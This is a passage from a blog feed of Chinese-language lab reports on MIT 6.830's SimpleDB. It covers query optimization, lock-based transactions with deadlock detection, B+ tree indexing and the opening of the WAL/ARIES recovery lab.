<p>除了页面逐出操作外，还需要实现 <code>flushPage</code> 方法将脏页面写回磁盘，但不逐出，以及 <code>discardPage</code> 将页面丢弃，不将页面写回磁盘。通过调用 <code>HeapFile.writePage</code> 以及直接操作 <code>BufferPool</code> 即可实现这两种操作。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 3 实验报告</title>
    <url>/blog/2022/11/26/MIT-6-830-3/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Lab
3 要实现的是查询优化模块。在数据库中，查询优化主要在查询被解析为抽象语法树后被调用，用于为指定的查询找到 “最优的” 执行计划。在 SimpleDb 中，这部分定义在 Optimizer 模块中，主要对联合操作进行优化。
<span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<p>查询优化模块的作用是为指定的查询找到高效的执行方案。由于 SQL 是声明式语言，查询只声明了想要的结果，并没有规定执行的具体方案。这些结果等价的方案存在于一个计划空间中，包含物理上等价或者关系代数等价的方案。</p>
<ul>
<li>物理等价是指操作的不同物理实现，比如 Join 是使用嵌套循环、Sort-Merge 还是其他，Scan 是使用 Heap
Scan 还是 Index Scan，等等。</li>
<li>关系代数等价是指，关系代数上等价的关系。例如一些操作的顺序是可交换的（例如 projection），多种同种操作是可串联的（例如 filter），等等。</li>
</ul>
<p>查询优化的终极目的，是在这个庞大的空间中找到实际上 “最优的” 方案，它使用以下子模块来完成：</p>
<ul>
<li>计划生成器：生成新的、结果等价的计划</li>
<li>成本估计器：估计一个计划的成本，包含 IO 和 CPU，其中 IO 占主要部分</li>
<li>搜索策略：如何在计划空间中行走，常使用动态规划策略</li>
</ul>
<p>为了对搜索空间进行剪枝，查询优化的开山之作，System
R 提出只考虑左深树，即执行树只有左侧是深的。这种树可以较好地流水线化。值得注意的是，由于各种原因，查询优化实际上经常找不到最优的实际执行方案，例如，成本估计器的误差，成本估计器基于选择度去计算操作前后的表规模，进而估算 IO 和 CPU
cost，每一步都会有误差。因此，实际上，查询优化器是去除一些看起来特别差的执行计划，与理想最优还有差距。</p>
<p>查询优化经常遵循一些启发式的策略，例如：</p>
<ul>
<li>尽早完成列和行的筛选，减小数据规模</li>
<li>避免表间的笛卡尔积</li>
<li>... 等等</li>
</ul>
<h2 id="exercise">Exercise</h2>
<h3 id="inthistogram">IntHistogram</h3>
<p>Histogram，即直方图，用于记录字段的统计信息，即字段值的分布，进而用于估计不同操作的选择度。这在成本估计器中会用到。这类直方图在构建时常用若干个等宽的桶，对应值区间，然后在这些桶间构建分布。IntHistogram 是对整型字段进行统计的类，它的构造函数如下：</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">IntHistogram</span><span class="params">(<span class="keyword">int</span> buckets, <span class="keyword">int</span> min, <span class="keyword">int</span> max)</span> </span>{</span><br><span class="line">    <span class="comment">// some code goes here</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>即根据桶的数量、最小值、最大值初始化一个直方图，然后通过 <code>addValue</code> 方法逐个将值加入，最后通过 <code>estimateSelectivity</code> 等方法，估计操作符的选择度。实现逻辑就是将值域等距地划分为指定数量的桶，在添加值时对应桶计数 + 1,。在估计选择度时，要按照两步走的方法，例如 &lt;=，先估计 &lt; 的比率，在桶内再根据均匀分布，估计 = 的比率，求和即可。</p>
<p>值得注意的是，StringHistogram 是通过将字符串映射到整型，再通过 IntHistogram 实现的。但是这两个类并没有实现同样的接口，这给后面带来了麻烦。</p>
<h3 id="tablestats">TableStats</h3>
<p>TableStats 记录了整张表的统计信息，包含每个字段的直方图，以及表的基数。正常应该是保存一个 <code>List&lt;Histogram&gt;</code>，用于保存每个字段的直方图。但并没有 <code>Histogram</code> 这样的接口，而重构代码还需要去修改测试代码，也并不是一种好的做法。我这里使用了一个 <code>List&lt;Object&gt;</code> 加强制类型转换完成，也不是一种值得提倡的做法。不过可以先达到效果。</p>
<p>在确定了如何保存直方图，还有一个问题是如何获得字段的最大最小值。因为直方图的构建需要指定最大最小值，之后才能一个个地添加值。这个过程不是一次遍历能够完成的。因此，需要先遍历一次，记录每个字段的最大最小值，构建直方图，再遍历一次逐个添加值。</p>
<h3 id="join-cardinality">Join Cardinality</h3>
<p>这个 exercise 要求去根据公式估计 join 操作结果的基数和操作成本。操作成本非常简单，根据在 Lab
2 中实现的 Join 策略计算即可。我 Lab
2 是使用的粗暴的嵌套循环的方法，将 IO 成本与 CPU 计算成本相加即可。join 操作的基数则相对难以估计。如果是 equijoin 且某侧字段为主键，那么基数一定不会超过另一张表的基数。这很容易理解，因为左侧主键是不重复的，右侧表中与主键相同的记录可以保留，其他则不会。如果不存在这样的条件，就需要一些策略去估计了：</p>
<ul>
<li>简单启发估计：如果是 equijoin，可以使用较大表的基数作为估计。如果是 range-join，可以按照一定的比例 * 笛卡尔积的基数，作为估计。</li>
<li>基于直方图：要获得准确一点的结果，需要根据两侧的直方图进行估计。例如 equijoin，对于每一个值，去估计在另一个直方图中的数量，然后两个数量相乘最后求和即可。range-join 则要在前一步的基础上，考虑两侧的比率。</li>
</ul>
<h3 id="join-ordering">Join Ordering</h3>
<p>最后一个 Exercise 要求实现找出多个 join 的最优执行方案。Join 操作的被封装在了 <code>LogicalJoinNode</code> 这个类中，包含 Join 的信息，例如两侧表、别名、Join 条件等。目标就是接收一个 <code>List&lt;LogicalJoinNode&gt;</code> 作为输入，找到最优的左深树联合顺序 <code>List&lt;LogicalJoinNode&gt;</code>。伪代码如下所示：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1. j = set of join nodes</span><br><span class="line">2. for (i in 1...|j|):</span><br><span class="line">3.     for s in {all length i subsets of j}</span><br><span class="line">4.       bestPlan = {}</span><br><span class="line">5.       for s' in {all length d-1 subsets of s}</span><br><span class="line">6.            subplan = optjoin(s')</span><br><span class="line">7.            plan = best way to join (s-s') to subplan</span><br><span class="line">8.            if (cost(plan) &lt; cost(bestPlan))</span><br><span class="line">9.               bestPlan = plan</span><br><span class="line">10.      optjoin(s) = bestPlan</span><br><span class="line">11. return optjoin(j)</span><br></pre></td></tr></tbody></table></figure>
<p>遵循动态规划的思想，按照规模从小到大的顺序建动态规划表。对于给定的规模 i，需要枚举所有该规模的子集，根据小规模的最优结果计算该子集的最优结果。这个伪代码看起来很简单，但是有以下几个难点：</p>
<ul>
<li>如何枚举指定规模的所有子集</li>
<li>如何计算指定 join 顺序的成本，如果子集的最优 join 顺序不支持新元素插入在最后面怎么办</li>
</ul>
<p>实验中给定了一些辅助方法，帮助我们解决了这些问题，虽然并不优雅：</p>
<ul>
<li><code>enumerateSubsets</code> 方法从规模为 1 开始，构建规模为 iS 支持，则直接跳过</li>
</ul>
<p>其中，<code>enumerateSubsets</code> 是一种非常低效的枚举策略，一次性地创建规模为 i 的 Set，会有较大的内存开销。正常的策略是遵循迭代器的模式，每次返回一个新的子集。join 顺序不支持直接跳过也是一种妥协，在动态规划的设定下。</p>
<p>这个 Exercise 就是在上面辅助函数的帮助下，实现上述伪代码。这里我写了一个迭代器类，替代一次返回所有结果的枚举函数。这个枚举函数实际上是在计算组合方案，相对容易改造成迭代器，维护多个指针，然后每次获取新元素时更新指针位置即可。如果是要计算排列方案的话，就要用那个基于左右箭头的算法了。</p>
<h2 id="总结">总结</h2>
<p>查询优化这个 Lab 本身难度不大，属于麻雀虽小五脏俱全。对于成本估计、方案生成、动态规划每部分都涉及到了，但都不深。查询优化的理论知识要更为复杂，只是获得一个搜索空间就要考虑各种关系代数的等价性、Join 交换时的条件问题等等。对于非左深树，这个空间会更大，剪枝和搜索也会更难。动态规划搜索理论上还要考虑每种方案的物理执行类型，是否有可用的排序结果等等。真正完成这些实践就属于重复造轮子了，过于复杂且没有必要。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 4 实验报告</title>
    <url>/blog/2022/11/29/MIT-6-830-4/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本次 Lab 主要实现的数据库的事务功能，包含并发控制、死锁检测等。本 Lab 要求实现一个页面粒度的锁管理器，支持多事务的并发，且使用等待图完成死锁的检测。</p>
<span id="more"></span>
<h2 id="理论知识">理论知识</h2>
<p>事务是一个包含多个操作的序列，应当被原子化地执行，其具有以下 ACID 特性：</p>
<ul>
<li>原子性（Atomicity:）：事务中的操作要么都被执行，要么都不被执行。</li>
<li>一致性（Consistency）：数据库是执行事务前是一致的，在执行事务后依然是一致的。</li>
<li>隔离性（Isolation）：每个事务的执行与其他事务隔离。实际上 DBMS
（数据库管理系统）会在多个事务间交叉执行，并不会按顺序一个个执行，但
DBMS 会保证每个事务看起来是隔离执行的，隐藏了并发的细节。</li>
<li>持久性（Durability）：如果事务提交到数据库，结果会持久存在，即使刚提交
DBMS 就崩溃了也一样。</li>
</ul>
<p>事务管理器包含以下两个模块：</p>
<ul>
<li>锁管理器：使用共享锁、排它锁、意向锁等实现事务间访问的并发控制</li>
<li>日志和恢复：当事务需要回滚时，逐步地撤销事务已完成的操作</li>
</ul>
<h3 id="严格两阶段锁">严格两阶段锁</h3>
<p>为了保证事务的 ACID 特性，DBMS 使用严格两阶段锁（Strict Two Phase
Locking）来完成事务的锁管理，该方法具有以下特点：</p>
<ul>
<li>每个资源有一个共享锁（S，Shared）和排它锁（Exclusive，X）。
<ul>
<li>至多一个事务可以持有该资源的排它锁，但是很多其他事务可以持有其的共享锁。</li>
</ul></li>
<li>事务在读之前必须获得排它锁，在写之前必须获得共享锁</li>
<li><strong>事务在释放任何锁之后都无法获得新锁</strong>。这是保证可串行性的关键。</li>
<li><strong>严格两阶段锁特性</strong>：事务在结束前统一释放锁，而非在过程中逐个释放锁。</li>
</ul>
<p>最后一点是为了避免级联回滚的问题。级联回滚意味着回滚一个事务会要求回滚另一个事务。考虑下面的场景</p>
<ol type="1">
<li>T1 先读、写了 R，但是还没有提交到 DBMS</li>
<li>T2 后读、写了 R</li>
</ol>
<p>这时，要回滚 T1，必须回滚 T2，因为 T2 读的是 T1 写后的数据，如果 T1
回滚了，就不存在 T2 读的数据了，即脏数据。</p>
<h3 id="死锁">死锁</h3>
<p>当事务间存在资源的循环等待，满足死锁条件时，就会发生死锁。在操作系统上，通常有以下三种方法处理死锁：</p>
<ul>
<li>预防。按照指定的顺序请求资源，例如静态指定顺序，打破循环等待条件。</li>
<li>避免。分配时预测是否可能出现死锁。</li>
<li>检测和处理。周期性检测是否有死锁，并处理</li>
</ul>
<p>也有一些数据库系统，直接不作处理。如果事务超时了就猜测发生了死锁，直接中止回滚。但这也会误伤真的需要很久才能计算出结果的事务，不提倡。</p>
<p>DBMS 广泛使用的是基于等待图的死锁检测。一个后台进程周期性地构建事务间的依赖图，当依赖图存在环时，就出现了死锁的循环等待条件，即出现了死锁。这种情况下就需要中止某个环内的事务打破循环，可以根据某些指标确定优先级，例如事务的持续时间、持有锁的数量等。</p>
<h3 id="意向锁">意向锁</h3>
<p>锁的粒度需要同时考虑并发性能和管理成本。考虑极端情况：</p>
<ul>
<li>只使用一个锁，锁住整个数据库，很简单，但是不能并行</li>
<li>对每个元组上锁，可以很好的并发，但是锁太多，需要庞大的内存开销，锁管理的负载也会很大</li>
</ul>
<p>因此，需要折中：</p>
<ul>
<li>细粒度的锁有利于并发</li>
<li>少数的锁方便管理</li>
</ul>
<p>多粒度加锁可以较好地折中，其思想是： -
不应该为所有的事务设置相同的锁粒度 - 允许数据可变规模 -
定义一个加锁的层级，高层包含低层 - 可以表示为一棵树</p>
<p>当对底层的元组或者页面加共享锁 / 排他锁时，需要相应的为高层页面加意向共享锁和意向排他锁。意向锁的设计允许高层节点进行
S 和 X
加锁时，无需检查所有的底层节点。如果没有意向锁，需要遍历所有底层节点才能知道能否给这个节点加锁。</p>
<h2 id="exercise">Exercise</h2>
<h3 id="lockmanager">LockManager</h3>
<p>该 Exercise 要求实现 <code>BufferPool</code> 中的读页面请求锁、释放锁等功能，指导书要求在页面层级管理锁，不能直接在表层级加锁。指导书建议使用一个 LockManager 类来管理所有的锁，我先介绍下我对这个类的设计。先从简单的资源抽象开始，一个资源应该由一个唯一键标识，例如 Page 有 PageId，Tuple 有 RecordId。因此，LockManager 实际是维护了一个资源 - 锁的 Map，资源是任意类型的 Object。而锁对象（<code>LockItem</code>），应该包含以下属性：持有锁的事务，当前锁的类型。当一个加锁请求（资源，锁类型，事务）到达锁管理器时：</p>
<ol type="1">
<li>先获取资源的 <code>LockItem</code></li>
<li><code>LockItem</code> 内，同步地判断能否完成这次加锁
<ul>
<li>若可以（锁无事务持有，或类型兼容，或可以直接升级锁），则加锁返回</li>
<li>否则，阻塞在 <code>LockItem</code> 对象上，等待其他事务释放锁后将其唤醒</li>
</ul></li>
</ol>
<p>当释放锁请求到达锁管理器时：</p>
<ol type="1">
<li>先获取资源的 <code>LockItem</code></li>
<li><code>LockItem</code> 内，同步地释放锁，并 <code>notifyAll</code> 其他阻塞线程</li>
</ol>
<p>在设计上，<code>LockManager</code> 应当遵循单例模式。我查阅了 JAVA 实现单例模式的几种方法，最优雅的就是使用枚举类。JAVA 保证了枚举类型的每个值都有唯一实例，进而可以简洁优雅、线程安全的实现单例模式。</p>
<h3 id="lock-lifetime">Lock Lifetime</h3>
<p>该 Exercise 要实现严格两阶段的锁生命周期：逐个地申请锁，只有在事务结束时才可以统一释放锁。锁的申请上，可以直接在 <code>BufferPool.getPage</code> 中进行申请，遵循一个即用即申的模式。</p>
<p>锁的释放上，正常应该在调用 <code>BufferPool.transactionComplete</code> 方法时，统一地释放所有锁。但会有些特殊情况，例如在插入元组的时候，扫到了一个页面没有空槽，这种情况下其实可以释放共享锁了。这看起来跟严格两阶段锁是违背的，但是实际上并不影响，因为插入元组这个操作中，只会对有空槽的页面造成影响。把这些锁及时释放可以允许更多的并行。</p>
<h3 id="no-steal">NO STEAL</h3>
<p>由于种种原因，事务可能中止，这时需要逐个地回滚事务已经完成的操作。在本次 Lab 中，由于还没有日志模块记录已经完成的操作，要使用 NO
STEAL 的模式。该模式的思想是，只有当事务提交到 DBMS 后，才将其脏页面写回磁盘。在页面逐出时不能逐出脏页面。这种思想非常的简单有效，只有事务提交后，脏页面写回磁盘，结果才真正生效。当事务中止时，直接将脏页面丢弃即可，无需额外回滚。但是这种方法也有问题，最大的问题是，BufferPool 中只有脏页面的时候，DBMS 就直接崩溃了。不过这种思想还是有好处的，事实上，页面逐出时，逐出脏页面会导致额外的写回开销，有一种策略就是优先逐出非脏页面，减少 IO。</p>
<p>这个 Exercise 在页面逐出时，按照优先级（例如 LRU）找到第一个非脏页面逐出即可。若页面全脏则抛出异常。</p>
<h3 id="transactions">Transactions</h3>
<p>根据上面已经实现的逻辑，实现 <code>transactionComplete(tid,
abort)</code> 方法。当事务中止结束时，丢弃脏页面；提交结束后，写回脏页面。无论哪种结束，事务都需要释放持有的所有锁。</p>
<h3 id="deadlocks-and-aborts">Deadlocks and Aborts</h3>
<p>最后来到了本 Lab 的重头戏，死锁的检测。正如前文所说，避免死锁的方法有简单的超时中止，还有基于检测的等待图。指导书要求不能使用简单的超时中止策略，建议在每次分配锁前构建等待图，判断是否会发生死锁。这时，申请加锁就变成了下面的流程：</p>
<ol type="1">
<li>判断此次加锁是否会引入新的等待关系
<ul>
<li>会，构建等待图，判断是否有死锁
<ul>
<li>有，抛出异常</li>
<li>没有，跳出</li>
</ul></li>
<li>不会，跳出</li>
</ul></li>
<li>正常申请锁</li>
</ol>
<p>可以看到，最重要的是多了一个<code>等待图</code>对象，需要保证它线程安全。可以直接使用一个 <code>HashMap&lt;TransacationId,
LockItem&gt;</code>，<code>HashMap</code> 本身不是线程安全的，需要读写时加 <code>synchornized</code>，也可以使用线程安全的、并发性能更好的 <code>ConcurrentHashMap</code>。它将 <code>HashMap</code> 按键分成了若干个段，读写时只对对应的段加锁，提升了并发性能。</p>
<h2 id="总结">总结</h2>
<p>本次 Lab 主要实现了事务的并发控制和死锁检测。正如指导书里面提到的，对并发进行 debug 是非常困难的事情。我本人花了一天时间才找到最后一个 exercise 的代码里的 bug 在哪里。当时还看了很多开源的代码实现，发现全是朴素的超时中止策略，没有使用等待图的。自己实现一遍还是收获颇丰。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>事务</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 5 实验报告</title>
    <url>/blog/2022/12/01/MIT-6-830-5/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Lab
5 要求实现 B + 树索引的相关逻辑，包含查找、插入、删除等，过程中需要维护 B + 树的阶性质。索引是一种数据结构，用于实现在某个字段上快速地查找和修改数据记录。对于常访问的字段，构建索引是很有必要的，B+
树是最为广泛使用的数据库索引。 <span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<p>索引用于加快高频字段的查找效率，例如用户 ID 这种字段，基本哪里都要用，每次都做全表扫描是不现实的。索引和记录间形成了一个一对一（多）的关系，取决于索引的键。下面先从简单的搜索树开始，对索引进行介绍。</p>
<h3 id="高扇出搜索树">高扇出搜索树</h3>
<p>先考虑简单的情况，在磁盘上按某个字段对表进行了排序。这种情况下不需要记录前后指针，因为物理上这些页面都是按序排列的。然后需要构建索引。为什么不用二分查找呢，因为二分查找也会导致<span class="math inline"> \(log_2N\)</span> 的页面 IO，是比较低效的。
可以构建一个 <code>&lt;key, Record&gt;</code> 的索引，由于 record
可能很大，而 key 很小，这种存储也很低效。因此可以使用指向 Page
的指针，<code>&lt;key,
PageId&gt;</code>，构建这样的一个搜索文件，在页面内完成二分查找。
这种算法是复杂度与之前的二分查找类似，只是<strong>常数更小，因为每个页面能存储更多的索引</strong>。这个过程可以递归完成，直到最顶层的索引只需要记录在一个页面中，变成了一个多叉的搜索树。
在该树下进行二分查找时，会在每个节点完成二分查找，然后定位下一层的节点，直到找到页面内。复杂度为<span class="math inline"> \(log_F(\#Pages)\)</span>，F 为节点的扇出（相较于 2
有了很大改进）。 分析该算法可知，该算法具有以下特点：</p>
<ol type="1">
<li>支持连续扫描。因为数据还是连续存储的</li>
<li>高扇出。因为索引记录比记录小很多，一个页面可以存储很多条索引。</li>
<li>不支持插入。当需要插入时，可能会导致页面溢出，这种情况需要后接页面形成链表。当插入过多时，就退化成了线性扫描。</li>
</ol>
<p>上述这种算法称为 ISAM（Indexed Sequential Access
Method），上世纪由 IBM 提出。</p>
<h3 id="b树">B + 树</h3>
<p>B + 树与上面的搜索树相似，也是一种多叉搜索树，但它支持动态插入，而且总是平衡的。B + 树的阶记为
d，每个内部节点（根节点除外）的子节点数量需要处在 [d,2d] 之间，每个节点的最大扇出是
2d+1，即 2d 个子节点划分得到 2d+1
个区间。B + 树的叶子节点上保存了左右兄弟的指针，可用于线性扫描。</p>
<p><img src="btree.png"></p>
<p>B + 树与 ISAM
的区别在于，<strong>在底层的叶子页面上，不需要严格按顺序排列</strong>，如上图所示。Page
3 和 Page 5 是邻居的关系，在磁盘上中间还隔着 Page
4。但是叶子节点间的前后指针使得可以遍历叶子页面。这也允许了动态地插入和删除。</p>
<p>典型设置，B + 树的阶为 1600，fill-factor 为
67%（叶子页面的记录占比）</p>
<ul>
<li>平均扇出为 2144</li>
<li> 假设是 128KB 的页面，每条记录 40B</li>
<li> 高度为 1 的树，<span class="math inline">\(2144^2=4,596,736\)</span>
records</li>
<li> 高度为 2 的树，<span class="math inline">\(2144^3=9,855,401,984\)</span> records 高</li>
</ul>
<p>高度为 2 的 B + 树就可以容纳近 10
亿的数据，B + 树会非常的矮，进而提高查找效率。B + 树的高度很少超过 3 和 4。</p>
<p><strong>查找</strong>：B + 树的查找与 ISAM
类似，从根节点起，在内部节点内做二分查找定位子节点，直到定位至叶子页面，再在页面内做二分查找。</p>
<p><strong>插入</strong>：</p>
<ul>
<li>当要插入的页面还有空间时，可以直接在页面内插入并排序。</li>
<li>当没有空间时，需要新建页面，并将一半的数据转移到新页面，将新页面插入到父节点中
<ul>
<li>如果父节点也满了，递归向上</li>
</ul></li>
</ul>
<p><strong>删除</strong>：删去元组后，可能会导致页面不满足阶约束，可以选择：</p>
<ul>
<li>直接忽略：数据库场景中，一般插入比删除多，因此删除多出来的空间可以保留，等待后续插入即可</li>
<li>维护约束：
<ul>
<li>当页面不满足约束时，从兄弟页面匀一些多余的元组过来</li>
<li>如果兄弟页面也没有多余的，就需要合并两个页面，递归向上删除节点</li>
</ul></li>
</ul>
<h2 id="exercise">Exercise</h2>
<h3 id="preliminary">Preliminary</h3>
<p>首先，先介绍下 SimpleDB 的 B + 树是怎么设计的。B + 树的页面被分为四种：</p>
<ul>
<li>BTreeHeaderPage：保存 B + 树索引文件的首部信息</li>
<li> BTreeRootPtrPage：用于保存 B + 树根节点的指向，类似一个假根节点，避免插入过程中根节点变化</li>
<li> BTreeInternalPage：非叶子节点，保存 m 个分界点以及 m+1 个子节点</li>
<li> BTreeLeafPage：叶子结点，保存元组数据，以及左右兄弟指针</li>
</ul>
<p>重点需要打交道的是最后两种，它们继承了抽象类 <code>BtreePage</code>，每个页面内包含一个父指针，用于处理递归向上的逻辑。<code>BTreeInternalPage</code> 暴露了一个 <code>Iterator&lt;BTreeEntry&gt;</code>，其中 <code>BTreeEntry</code> 包含以下属性：</p>
<ul>
<li>key：一个值，代表分界点</li>
<li> leftChildId：左孩子的页面 ID</li>
<li>rightChildId：右孩子的页面 ID</li>
</ul>
<p>一个 <code>BTreeInternalPage</code> 保存 m 个分界点，即 m+1 个子节点。</p>
<h3 id="search">Search</h3>
<p>首先，要实现的是查找方法，<code>findLeafPage()</code>，该方法接收一个页面和 <code>Field</code>，返回这个值对应的叶子页面。上面提到，正常在节点内应该是使用二分查找找到对应的孩子节点。由于 <code>BTreeInternalPage</code> 只对外暴露了 <code>Iterator&lt;BTreeEntry&gt;
iterator()</code> 方法，这里只能使用遍历的方法，找到孩子节点对应的值区间。再递归查找直到找到叶子页面。</p>
<h3 id="insert-split">Insert （Split）</h3>
<p>然后来到了重头戏，B + 树的插入。Lab 里将拆分节点分为了两个方法，需要分别实现：</p>
<ul>
<li><code>splitLeafPage()</code>：拆分叶子结点，可能需要递归调用父节点的拆分</li>
<li><code>splitInernalPage()</code>：拆分非叶子节点，可能需要递归调用父节点的拆分</li>
</ul>
<p>拆分节点的逻辑可以分为下面几步：</p>
<ol type="1">
<li>新建空白页面，转移一半的数据到新页面，一般是把值较大的一半转移过去</li>
<li>判断父节点是否有空槽，没有的话递归拆父节点</li>
<li>将新页面关联到父页面
<ul>
<li>维护两个页面和父页面间的指向</li>
<li>在父页面新建 entry，key 为大页面的最小值，
左右孩子分别为原页面和新页面</li>
</ul></li>
<li>对于叶子结点，维护左右兄弟指针</li>
</ol>
<p>这里需要注意的是，要把修改后的页面更新在 <code>dirtypages</code> 中，否则会出现读取不一致的现象。Lab 提供了递归的拆分辅助方法，名为 <code>getParentWithEmptySlots</code>，其会判断父页面中是否有空槽，没有的话调用 <code>splitInternalPage</code> 将其拆分，返回一个带有空槽的父页面。</p>
<h3 id="delete-steal">Delete (Steal)</h3>
<p>这个 exercise 要求实现带 “偷取” 逻辑。当一个页面不满足半满约束时，需要从它的兄弟页面中匀一些多余的数据过来。根据页面、兄弟的类型，这部分逻辑被分散在三个方法中：</p>
<ul>
<li><code>stealFromLeafPage</code>：叶子结点间的偷取，<code>isRightSibling</code> 参数标识是否是右侧兄弟</li>
<li><code>stealFromLeftInternalPage</code>：从左侧内部节点偷取</li>
<li><code>stealFromRightInternalPage</code>：从右侧内部节点偷取</li>
</ul>
<p>偷取的逻辑可以分为下面几步：</p>
<ol type="1">
<li>均匀地把数据匀过去，对于每条数据
<ol type="1">
<li>如果是叶子页面的元组记录，转移即可</li>
<li>如果是内部节点的 key 和 child 记录，需要新建 Entry 插入</li>
</ol></li>
<li>更新父节点中 Entry 的 key 值，需要根据左右关系，选择大页面中的最小值作为新的 key 值</li>
<li>更新父节点指向关系</li>
</ol>
<h3 id="deletemerge">Delete（Merge）</h3>
<p>当偷取已经不能满足需要的时候，需要合并两个均达不到半满的节点。同样的，根据节点类型，可以分为：</p>
<ul>
<li><code>mergeLeafPages</code>：合并两个叶子结点</li>
<li><code>mergeInternalPages</code>：合并内部节点</li>
</ul>
<p>合并可以看成偷取的一种极端情况，将两个节点所有的数据都匀到一个节点中，然后删除掉空页面以及父节点中的对应 entry。这个过程中也可能会导致递归向上删除。Lab 提供了 <code>deleteParentEntry</code> 的工具方法来处理删除父节点的 entry 后不满足半满约束的情况，会调用 <code>handleMinOccupancyPage</code> 根据情况调用偷取和合并方法。</p>
<p>当四个 exercise 做完，理论上已经可以通过这四个 exercise 的所有 Test。由于 SimpleDB 本身是使用的页面级别的锁，不存在意向锁的 phantom 问题，如果锁实现正确的话，应该也可以通过 BTreeNextKeyLockingTest 和 BTreeDeadlockTest。如果到目前为止一切都正确，应该可以通过一个很难的 <code>BTreeTest</code>。</p>
<h2 id="总结">总结</h2>
<p>本次 Lab 主要完成了 B + 树的增删查逻辑。Lab 提供了 B + 树索引的整体框架，只需要实现核心的增删查逻辑即可。B + 树还是一个非常复杂的数据结构，自己从头实现的话估计得很久。不过经过这个 Lab，对 B + 树的操作有了更深的认识。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>B+树</tag>
        <tag>索引</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 6 实验报告</title>
    <url>/blog/2022/12/02/MIT-6-830-6/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Lab
6 要求实现数据库的恢复功能。在真实场景下，数据库可能因为种种原因宕机崩溃，需要保证此时的数据不会丢失，保证数据库事务的 ACID 性质。这往往要通过日志来实现。</p>
<span id="more"></span>
<h2 id="理论知识">理论知识</h2>
<p>前面提到了，事务需要具备 ACID 性质，其中有两点需要关注：</p>
<ul>
<li>原子性：事务可能会中止，需要回滚</li>
<li>持续性：如果 DBMS 崩溃了怎么办</li>
</ul>
<p>事务中止的原因可能有很多，例如执行出错、出现死锁等。DBMS 崩溃的原因也有很多，例如磁盘空间不足、管理员误操作等。如何在这些场景下保证数据库的一致性、可靠性等，是一个很重要的问题。看过之前博客的同学可能记得，在 Lab4 中，实现了 NO
STEAL 的模式。其思想是将事务的脏页面在 BufferPool 中置顶，不将其逐出，直到事务提交后再逐出。这在一定程度上可以解决原子性的问题，但是 BufferPool 一旦满了，DBMS 就直接崩溃了。</p>
<h3 id="wal">WAL</h3>
<p>数据库常使用先写日志（Write-Ahead
Logging，WAL）与 ARIES 算法解决原子性和持续性的问题。WAL 的思想是，先写日志，再写数据，遵循下面的协议</p>
<ol type="1">
<li>在更新数据到磁盘前，必须强制保存日志</li>
<li>在事务提交前，必须强制保存所有日志</li>
</ol>
<p>日志是一个多元组，例如 &lt;XID, pageID, offset, length, old data, new
data&gt;，包含事务 ID、页面 ID、偏移、修改前后的数据等信息。有了这些信息，就可以解决 ACID 的两个问题：</p>
<ul>
<li>如何回滚事务：根据日志，回滚该事务，用旧值覆盖新值</li>
<li>如果 DBMS 崩溃了怎么恢复：根据日志，重做部分事务，用新值替换旧值</li>
</ul>
<p>可以看到，在 WAL 的写日志协议中，第一点包含了 UNDO
的信息，保证了写到磁盘的数据必定可以通过日志回滚，确保了原子性，第二点包含了重做的信息，保证了已经提交的事务，必定可以通过日志重新复现其结果，确保了持续性。</p>
<p>WAL 容易混淆的一点是，因为写日志先于写磁盘，所以：</p>
<ul>
<li>日志中出现了 UPDATE 记录，<strong>并不意味更新在磁盘上生效了</strong></li>
<li>日志中出现了 COMMIT 记录，<strong>并不意味着事务在磁盘上提交到 DBMS 了</strong></li>
</ul>
<p>所以，对于日志中的 COMMIT 的事务，也需要对其重做，因为它的结果可能并没有保存到磁盘中。WAL 确保了可以通过日志撤销和重做操作，与我们平时的使用日志习惯：“先出现现象，再记录现象”，是相反的。这点需要深刻理解。</p>
<h3 id="arise">ARISE</h3>
<p>ARISE 算法就使用这种 WAL 的日志，在数据库崩溃时，分三阶段处理：</p>
<ol type="1">
<li>分析：分析最新的检查点到崩溃中间的日志，分析崩溃时的状态
<ol type="1">
<li>BufferPool 中有哪些脏页面</li>
<li>还有哪些事务正在运行（即崩溃中止了）</li>
</ol></li>
<li>重做：从脏页面对应的日志中的最早修改记录开始，逐个地重做结果</li>
<li>撤销：从崩溃位置开始，到崩溃中止事务的最早日志，倒序地撤销结果</li>
</ol>
<p>如下图所示（来自伯克利 CS186），A、R、U 分别对应阶段 1、2、3。需要注意的是，重做的时候重做了所有的操作，包含最后中止的事务操作。这样的优点是确保不会出错，能够完美复现数据库崩溃时的状态，而且扩展性更好。撤销的时候需要倒序撤销，因为同一个页面可能被更新多次，撤销的最终结果的修改的最初结果。</p>
<p><img src="ARIES.png"></p>
<h2 id="exercise">Exercise</h2>
<h3 id="preliminary">Preliminary</h3>
<p>首先介绍下 SimpleDB 的日志模块，根据 <code>LogFile</code> 可知，其日志的格式如下：</p>
<ol type="1">
<li>文件最开始的 8 个字节，标识日志文件中最新的检查点在文件中的偏移</li>
<li>之后每条记录的格式为 <code>&lt;int Type, long tid, [additional info],
offset&gt;</code>，其中
<ol type="1">
